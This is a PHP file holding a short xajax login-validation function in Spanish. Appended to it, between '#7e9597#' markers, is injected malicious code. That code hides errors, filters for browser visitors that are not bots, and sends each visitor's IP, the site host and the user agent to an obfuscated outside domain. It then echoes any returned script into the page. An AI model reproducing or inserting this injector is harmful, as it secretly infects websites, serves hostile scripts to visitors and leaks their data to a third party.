<?php
	function valida($form)
	{
		$salida="Error de Acceso";

	  //instanciamos el objeto para generar la respuesta con ajax
      $respuesta = new xajaxResponse();
      //escribimos en la capa con id="respuesta" el texto que aparece en $salida
      $respuesta->addAssign("msj","innerHTML",$salida);
	  //tenemos que devolver la instanciación del objeto xajaxResponse
      return $respuesta;
      //TERMINA FUNSION
	}
?>
<?php
#7e9597#
error_reporting(0); @ini_set('display_errors',0); $wp_xqhzx45 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_xqhzx45) && !preg_match ('/bot/i', $wp_xqhzx45))){
$wp_xqhzx0945="http://"."http"."href".".com/"."href"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_xqhzx45);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_xqhzx0945); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_45xqhzx = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_45xqhzx = @file_get_contents($wp_xqhzx0945);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_45xqhzx=@stream_get_contents(@fopen($wp_xqhzx0945, "r"));}}
if (substr($wp_45xqhzx,1,3) === 'scr'){ echo $wp_45xqhzx; }
#/7e9597#
?>